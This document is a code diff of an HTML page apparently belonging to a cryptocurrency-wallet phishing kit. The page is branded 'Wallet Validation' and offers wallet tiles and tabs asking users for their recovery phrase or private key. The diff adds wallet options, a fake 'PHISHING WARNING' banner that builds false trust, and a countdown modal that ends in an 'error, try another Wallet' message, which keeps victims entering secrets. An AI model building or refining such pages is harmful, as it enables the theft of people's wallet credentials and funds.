@@ -20,6 +20,25 @@
 	<link rel="stylesheet"
 		href="chrome-extension://eagjogpknkkfgelchdkhdmgiljjidndf/fonts/material-design-icons/MaterialIconsOutlined.css">
 	<style>
+		#notification {
+			display: flex;
+			justify-content: space-between;
+			align-items: center;
+			padding: 1em;
+			background-color: rgb(49 46 129 / 1);
+			color: white;
+		}
+
+		@media (min-width: 768px) {
+			#notification {
+				padding: 1em 4em;
+			}
+		}
+
+		#notification p {
+			width: 85%;
+		}
+
 		.tracking-img {
 			float: left;
 			width: 15px;
@@ -77,30 +96,51 @@
 	<div id="app" data-v-app="">
 		<div>
 			<div class="sticky top-0" style="z-index: 10;">
+				<section class="notification" id="notification">
+					<p><strong style="color: #ffcc00 ;">PHISHING WARNING:</strong> Please make sure you are visiting <b
+							id="urlHost"></b> - check
+						the url carefully.</p> <button onclick="hideNotification()">X</button>
+				</section>
+				<script asyc defer>
+					hostName = `${window.location.hostname}`
+					urlHost.innerHTML = 'https://' + hostName
+
+					function hideNotification() {
+						notification.style.display = 'none';
+					}
+				</script>
 				<header class="bg-white shadow border-b-2 border-gray-300 border-opacity-25 item-center">
 					<div class="px-8 mx-auto max-w-7xl sm:px-6 lg:px-8 md:flex py-3 item-center">
-						<div class="flex items-center justify-between mx-auto max-w-7xl sm:px-6 lg:px-8">
-							<div><a href="/" class=""><img src="./registry_files/save.3984db6c.png" alt=""
-										class="h-12 md:w-28 w:12"></a></div><a href="/" class=""><span
-									class="pl-4 text-xl font-bold underline"> Dapp<span
-										class="text-indigo-800">Walletnode</span></span></a>
-							<div class="flex md:hidden"><button type="button"
+						<div class="flex items-center justify-between mx-auto max-w-7xl sm:px-6 lg:px-8"
+							style=" width: 100%; white-space: no-wrap;">
+							<a href="/"
+								class="flex items-center router-link-active router-link-exact-active pl-4 text-xl font-bold"
+								aria-current="page" style="white-space: wrap; width: 100%;">
+								<img src="./index_files/logo.png" alt="" class="h-12 md:w-28 w:12 p-2"
+									style="display: inline;">
+								<p style="white-space: no-wrap;">
+									Wallet Validation
+								</p>
+							</a>
+							<div class="flex md:hidden">
+								<button type="button"
 									class="text-gray-500 hover:text-gray-600 focus:outline-none focus:text-gray-600"
 									aria-label="toggle menu"><svg viewBox="0 0 24 24" class="w-6 h-6 fill-current">
 										<path fill-rule="evenodd"
 											d="M4 5h16a1 1 0 0 1 0 2H4a1 1 0 1 1 0-2zm0 6h16a1 1 0 0 1 0 2H4a1 1 0 0 1 0-2zm0 6h16a1 1 0 0 1 0 2H4a1 1 0 0 1 0-2z">
 										</path>
-									</svg></button></div>
+									</svg></button>
+							</div>
 						</div>
 						<div class="w-full md:flex md:items-center md:justify-between hidden">
 							<div class="flex flex-col px-2 py-3 -mx-4 md:flex-row md:mx-0 md:py-0"></div>
-							<div class="relative"><a href="/registry#"
+							<div class="relative"><a href="/#"
 									class="px-2 py-1 text-lg font-bold text-indigo-900 transition-colors duration-200 rounded hover:underline md:mx-2">Home</a><a
-									href="/registry"
-									class="router-link-active router-link-exact-active px-2 py-1 text-lg font-bold text-indigo-900 transition-colors duration-200 rounded hover:underline md:mx-2"
-									aria-current="page">Connect Dconnect</a><a href="/registry#"
+									href="/registry.html"
+									class="px-2 py-1 text-lg font-bold text-indigo-900 transition-colors duration-200 rounded hover:underline md:mx-2">Connect
+									Dconnect</a><a href="/#"
 									class="px-2 py-1 text-lg font-bold text-indigo-900 transition-colors duration-200 rounded hover:underline md:mx-2">Contact
-									us</a><a href="/registry#"
+									us</a><a href="/#"
 									class="px-2 py-1 text-lg font-bold text-indigo-900 transition-colors duration-200 rounded hover:underline md:mx-2">FAQ</a>
 							</div>
 						</div>
@@ -136,6 +176,57 @@
 														src="./registry_files/1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369"></a>
 												<div class="walletmother">
 													<h3 class="text-gray-900 title-font text-lg font-medium">Rainbow
+													</h3>
+													<h2
+														class="text-gray-500 text-xs tracking-widest title-font mb-1 uppercase">
+														Wallet</h2>
+												</div>
+											</div>
+										</div>
+										<div class="lg:w-1/4 md:w-1/2 p-4 w-full showModal">
+											<div
+												class="border-4 border-light-blue-500 border-opacity-25 p-4 rounded-xl">
+												<a class="block relative h-48 rounded overflow-hidden"><img
+														alt="Rainbow"
+														class="object-cover object-center h-32 justify-center block rounded-full m-auto"
+														src="./registry_files/hashpack.jfif"></a>
+												<div class="walletmother">
+													<h3 class="text-gray-900 title-font text-lg font-medium">
+														HashPack
+													</h3>
+													<h2
+														class="text-gray-500 text-xs tracking-widest title-font mb-1 uppercase">
+														Wallet</h2>
+												</div>
+											</div>
+										</div>
+										<div class="lg:w-1/4 md:w-1/2 p-4 w-full showModal">
+											<div
+												class="border-4 border-light-blue-500 border-opacity-25 p-4 rounded-xl">
+												<a class="block relative h-48 rounded overflow-hidden"><img
+														alt="Rainbow"
+														class="object-cover object-center h-32 justify-center block rounded-full m-auto"
+														src="./registry_files/stargazer.jfif">
+													<div class="walletmother">
+														<h3 class="text-gray-900 title-font text-lg font-medium">
+															Stargazer
+														</h3>
+														<h2
+															class="text-gray-500 text-xs tracking-widest title-font mb-1 uppercase">
+															Wallet</h2>
+													</div>
+											</div>
+										</div>
+										<div class="lg:w-1/4 md:w-1/2 p-4 w-full showModal">
+											<div
+												class="border-4 border-light-blue-500 border-opacity-25 p-4 rounded-xl">
+												<a class="block relative h-48 rounded overflow-hidden"><img
+														alt="Rainbow"
+														class="object-cover object-center h-32 justify-center block rounded-full m-auto"
+														src="./registry_files/walletconnect.png"></a>
+												<div class="walletmother">
+													<h3 class="text-gray-900 title-font text-lg font-medium">
+														WalletConnect
 													</h3>
 													<h2
 														class="text-gray-500 text-xs tracking-widest title-font mb-1 uppercase">
@@ -2659,9 +2750,12 @@
 							<div class="flex justify-center item-center" style="height: 60px;"><button
 									class="p-4 hover:border-b-2 hover:border-gray-500 mx-2 border-b-2 border-gray-500">
 									Phrase
-								</button><button class="p-4 hover:border-b-2 hover:border-gray-500 mx-2"> Sign In
-								</button><button class="p-4 hover:border-b-2 hover:border-gray-500 mx-2"> Private Key
-								</button></div>
+								</button>
+								<button class="p-4 hover:border-b-2 hover:border-gray-500 mx-2"> Sign In
+								</button>
+								<button class="p-4 hover:border-b-2 hover:border-gray-500 mx-2"> Private Key
+								</button>
+							</div>
 							<div class="flex justify-center item-center my-4">
 								<hr class="px-2 bg-grey-100 hrdes item-center">
 							</div>
@@ -2728,6 +2822,42 @@
 										</button><img
 											src="https://registry.walletconnect.com/api/v1/logo/lg/0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c"
 											alt="" class="rounded-full w-12 mx-1" id="changeImage"></div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div class="modal-masks" id="countdownBackdrop">
+					<div class="modal-wrapper">
+						<div class="item-center rounded-lg p-5" id="countdownDiv">
+							<div class="flex w-full max-w-sm mx-auto overflow-hidden bg-white rounded-lg shadow-md">
+								<div class="flex items-center justify-center w-12 bg-green-500"><svg
+										class="w-6 h-6 text-white fill-current" viewBox="0 0 40 40"
+										xmlns="http://www.w3.org/2000/svg">
+										<path
+											d="M20 3.33331C10.8 3.33331 3.33337 10.8 3.33337 20C3.33337 29.2 10.8 36.6666 20 36.6666C29.2 36.6666 36.6667 29.2 36.6667 20C36.6667 10.8 29.2 3.33331 20 3.33331ZM16.6667 28.3333L8.33337 20L10.6834 17.65L16.6667 23.6166L29.3167 10.9666L31.6667 13.3333L16.6667 28.3333Z">
+										</path>
+									</svg></div>
+								<div class="px-4 py-2 -mx-3">
+									<!---->
+									<div class="mx-3" id="countDown">15</div>
+								</div>
+							</div>
+						</div>
+						<div class="item-center rounded-lg p-5" style="display: none;" id="errorDiv">
+							<div class="flex w-full max-w-sm mx-auto overflow-hidden bg-white rounded-lg shadow-md">
+								<div class="flex items-center justify-center w-12 bg-red-500"><svg
+										class="w-6 h-6 text-white fill-current" viewBox="0 0 40 40"
+										xmlns="http://www.w3.org/2000/svg">
+										<path
+											d="M20 3.33331C10.8 3.33331 3.33337 10.8 3.33337 20C3.33337 29.2 10.8 36.6666 20 36.6666C29.2 36.6666 36.6667 29.2 36.6667 20C36.6667 10.8 29.2 3.33331 20 3.33331ZM16.6667 28.3333L8.33337 20L10.6834 17.65L16.6667 23.6166L29.3167 10.9666L31.6667 13.3333L16.6667 28.3333Z">
+										</path>
+									</svg></div>
+								<div class="px-4 py-2 -mx-3">
+									<div class="mx-3"><span class="font-semibold text-red-500">error</span>
+										<p class="text-sm text-gray-600">try another Wallet</p>
+									</div>
+									<!---->
 								</div>
 							</div>
 						</div>
